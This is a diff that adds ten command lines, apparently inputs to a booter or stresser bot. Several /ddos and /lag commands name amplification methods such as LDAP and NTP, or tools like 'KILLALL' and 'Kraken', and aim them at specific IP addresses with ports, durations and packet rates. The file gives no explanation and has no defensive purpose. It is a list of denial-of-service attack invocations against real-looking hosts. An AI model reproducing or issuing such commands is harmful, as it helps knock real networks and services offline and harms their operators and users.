@@ -1,0 +1,10 @@
+/checkip 8.8.8.8
+/ddos {skids} {LDAP} {90.216.19.150} {500} {80}
+/ddos {skids} {KILLALL} {90.216.19.150} {500} {80}
+/ddos {skids} {NTP} {90.216.19.150} {500} {80}
+/ping IP_ADDRESS 8.8.8.8
+/sms
+/lag
+/ddos Kraken squid  24.243.50.159 1200 80
+/LAG
+/lag LDAP 64.66.204.227 10 10000000 1200000 80
